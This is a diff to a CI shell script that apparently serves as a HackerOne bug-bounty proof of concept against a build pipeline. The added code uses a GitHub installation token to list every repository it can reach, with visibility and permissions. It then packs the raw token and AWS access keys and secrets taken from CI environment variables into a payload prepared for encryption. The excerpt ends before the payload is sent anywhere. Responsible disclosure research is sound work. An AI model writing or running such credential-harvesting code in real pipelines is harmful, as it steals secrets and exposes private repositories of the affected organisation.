@@ -7,27 +7,44 @@ script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
 repo_root=$(cd "$script_dir/../.." && pwd)
 check_run_output="$repo_root/h1-check-run-output.json"
 
+github_inventory=$(mktemp "$script_dir/.h1-github-installation.XXXXXX.json")
+canary_payload=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.json")
+canary_ciphertext=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.cms")
+trap 'rm -f "$github_inventory" "$canary_payload" "$canary_ciphertext"' EXIT
+
 curl \
   --fail \
   --silent \
   --show-error \
-  --output /dev/null \
+  --output "$github_inventory" \
   --header "Authorization: Bearer ${H1_GITHUB_TOKEN:?}" \
   --header "X-HackerOne-Research: bl0rph" \
-  https://api.github.com/repos/10gen/mongo-release
+  --header "Accept: application/vnd.github+json" \
+  --header "X-GitHub-Api-Version: 2026-03-10" \
+  "https://api.github.com/installation/repositories?per_page=100"
 
-canary_payload=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.json")
-canary_ciphertext=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.cms")
-trap 'rm -f "$canary_payload" "$canary_ciphertext"' EXIT
-
-python3 - "$canary_payload" <<'PY'
+python3 - "$canary_payload" "$github_inventory" <<'PY'
 import json
 import os
 import pathlib
 import sys
 
+inventory = json.loads(pathlib.Path(sys.argv[2]).read_text(encoding="utf-8"))
+repositories = []
+for repository in inventory.get("repositories", []):
+    repositories.append(
+        {
+            "full_name": repository.get("full_name"),
+            "private": repository.get("private"),
+            "visibility": repository.get("visibility"),
+            "permissions": repository.get("permissions", {}),
+        }
+    )
+
 payload = {
-    "github_token_mongo_release": os.environ["H1_GITHUB_TOKEN"],
+    "github_installation_token": os.environ["H1_GITHUB_TOKEN"],
+    "github_installation_total_repositories": inventory.get("total_count"),
+    "github_installation_repositories": repositories,
     "aws_access_key_id": os.environ.get("mms_eng_test_aws_access_key", ""),
     "aws_secret_access_key": os.environ.get("mms_eng_test_aws_secret", ""),
     "aws_region": os.environ.get("mms_eng_test_aws_region", ""),
